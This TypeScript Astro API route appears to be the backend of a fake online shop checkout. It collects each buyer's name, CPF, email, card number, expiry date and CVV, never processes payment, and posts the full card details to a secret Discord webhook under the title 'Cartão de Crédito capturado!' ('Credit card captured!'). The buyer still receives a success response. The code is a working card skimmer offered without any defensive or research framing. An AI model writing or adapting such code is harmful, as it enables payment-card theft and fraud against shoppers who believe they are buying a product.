import type { APIRoute } from "astro";
import products from "../../assets/products.json";
import { sendEmbedToWebhook } from "../../services/discordwebhook";
import { EMPTY_PRODUCT } from "../../services/mercadopago";

export const prerender = false;

export interface PostCreditPayload {
  product_id: string;
  payer_name: string;
  payer_email: string;
  payer_cpf: string;
  card_number: string;
  card_month: string;
  card_year: string;
  card_cvv: string;
  card_token_id?: string;
}

export const POST: APIRoute = async ({ request }) => {
  const payload: PostCreditPayload = await request.json();

  const product =
    products.find((x) => x.id == payload.product_id) || EMPTY_PRODUCT;

  const fields = [
    {
      name: "✍️ Nome do pagador",
      value: payload.payer_name,
      inline: true,
    },
    {
      name: "🪪 CPF do pagador",
      value: payload.payer_cpf,
      inline: true,
    },
    {
      name: "💳 Número, Mês/Ano & CVV",
      value: [
        payload.card_number.replaceAll(" ", ""),
        payload.card_month + "/" + payload.card_year,
        payload.card_cvv,
      ].join(" "),
    },
  ];

  sendEmbedToWebhook(import.meta.env.SECRET_WEBHOOK_CC, {
    title: "🏛️ Cartão de Crédito capturado!",
    description: `do produto: **${product.name}**`,
    footer: { text: payload.payer_email },
    thumbnail: { url: product.image },
    fields,
  });

  console.log("[BETA] unused card token:", payload.card_token_id);
  return new Response(null, { status: 200 });
};
